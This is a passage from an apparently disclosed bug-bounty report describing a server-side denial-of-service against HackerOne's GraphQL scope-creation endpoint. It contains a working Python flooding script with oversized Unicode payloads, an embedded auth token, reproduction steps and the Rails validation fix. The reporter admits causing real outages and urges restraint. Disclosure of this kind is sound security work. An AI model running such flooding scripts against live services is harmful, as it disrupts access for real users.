I would advise you that when testing for DoS, once you receive an error and get huge amounts of delays please stop immediately, and report right away. Do not do what I did on this report. Thank you!**\n\n---\n\nOn the program [sandbox](https://hackerone.com/teams/new/sandbox) I have found that when creating domain instructions when adding a scope there is no input validation which was the cause of the server-side DoS. The character limit on the big input boxes is set to 10k, however with this I observed that there was not any, at first I reported this as a client-side DoS because it would render the scope management page unusable and there was no way to delete it, it was then closed as a duplicate of #584030 however digging further into this, I made a python script that allowed me to upload large amounts of payloads every request I then put it into a loop and around 350+ request I noticed an **HTTP 500 Internal Server Error** I then stopped to see if I had caused disruption, at first the page were loading fine so I run the python script again **(note : I was running this python script on 4 terminals)** and again, after a while this is when I noticed disruption on my side, and to confirm I asked the people from discord if they got disruption and they did. They received an a **502, and a 504 HTTP** errors, and caused disruption on my side as well.\n\n**Python Script (note: you need to put your own cookies if you want to try)**\n```\n\nimport requests\n\ng = input(\"Enter : \") \n\nburp0_url = \"https://hackerone.com:443/graphql\"\nburp0_cookies = x\nburp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://hackerone.com/testingfordos/scopes/new\", \"content-type\": \"application/json\", \"X-Auth-Token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTI1MzI0MzV9.qyfpwC--aQXOLd9TQ7l-016rI0wXZ33ocCvL10DU6dc----5047344\", \"Origin\": \"https://hackerone.com\", \"Connection\": \"close\"}\n\na = \"\"\n\nfor i in range(15000):    \n    a += \"بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ\"\n\nfor i in range(50):\n\n    burp0_json={\"operationName\": \"CreateStructuredScope\", \"query\": \"mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\\n    was_successful\\n    team {\\n      id\\n      structured_scopes(first: 500) {\\n        edges {\\n          node {\\n            id\\n            __typename\\n          }\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\", \"variables\": {\"asset_identifier\": str(i) + str(g) + \".com\", \"asset_type\": \"URL\", \"availability_requirement\": \"high\", \"confidentiality_requirement\": \"high\", \"eligible_for_bounty\": True, \"eligible_for_submission\": True, \"instruction\": a+a+a+a+a+a+a+a+a+a, \"integrity_requirement\": \"high\", \"label_ids\": [], \"notify_subscribers_of_changes\": True, \"reference\": \"sadasdasdas\", \"team_id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg=\"}}\n\n    x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)\n    print(str(x.status_code) + \" Status - Delay : \" + str(x.elapsed.total_seconds()) + \" seconds\")\n    print(x._content)\n```\n**Steps To Reproduce :**\n>1. Add a domain on Scope Management\n2. Intercept this POST /graphql the one with the \"operationName\":\"CreateStructuredScope\"\n3. Now put a huge payload on instruction parameter and keep sending it\n4. Reload pages until disruption is observed\n\nThe report was then triaged right 10 mins after reporting, and I was told by @jobert to stop my test. The team then rolled a fix which looked like this :\n\n```\ndiff --git a/app/models/structured_scope.rb b/app/models/structured_scope.rb\nindex f975f383c4..6c3928d2a7 100644\n--- a/app/models/structured_scope.rb\n+++ b/app/models/structured_scope.rb\n@@ -97,7 +97,8 @@ class StructuredScope < ApplicationRecord\n     AVAILABILITY_REQUIREMENT,\n   ].freeze\n\n-  MAX_INSTRUCTION_LENGTH = 5000\n+  MAX_INSTRUCTION_LENGTH = 10000\n+  MAX_REFERENCE_LENGTH = 1000\n\n   validates :asset_identifier, presence: true\n   validates :asset_type, inclusion: { in: ASSET_TYPES }\n@@ -109,7 +110,8 @@ class StructuredScope < ApplicationRecord\n   }\n   validate :eligibility\n   validates_with CountryValidator, fields: [:country], alpha2: true\n-  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }, on: :create\n+  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }\n+  validates :reference, length: { maximum: MAX_REFERENCE_LENGTH }\n```\n\nAs you can see, there is now input validation to this which immediately stopped the server-side DoS from happening as it would block the request. Again, please test responsibly for DoS vulnerabilities responsibly don't cause harm to program's services. Thank you! :)\n",
